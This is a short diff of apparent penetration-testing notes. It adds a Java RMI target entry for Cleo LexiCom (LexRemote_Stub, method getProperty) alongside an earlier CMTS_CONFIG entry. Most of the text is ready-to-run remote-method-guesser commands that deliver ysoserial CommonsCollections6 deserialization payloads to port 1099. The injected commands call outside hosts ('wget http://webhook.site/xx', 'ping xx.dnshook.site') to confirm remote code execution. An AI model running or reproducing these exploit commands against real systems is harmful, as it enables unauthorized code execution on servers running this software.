@@ -112,3 +112,16 @@ method discovered :
 String reload(String var1)
 
 java -jar rmg-5.1.0-jar-with-dependencies.jar serial xx 1099 CommonsCollections6 'wget http://webhook.site/xx' --signature 'String reload(String var1)' --bound-name CMTS_CONFIG --yso /root/Desktop/yso/ysoserial-all.jar
+
+
+
+4------------------------------------------------------------------------
+
+[+]     - com.cleo.lexicom.LexiCom
+[+]             --> com.cleo.lexicom.LexRemote_Stub (unknown class)
+
+method discovered :
+String getProperty(String property)
+
+
+java -jar rmg-5.1.0-jar-with-dependencies.jar serial xx 1099 CommonsCollections6 'ping xx.dnshook.site' --signature 'String getProperty(String property)' --bound-name 'com.cleo.lexicom.LexiCom'  --stack-trace --yso /root/Desktop/yso/ysoserial-all.jar
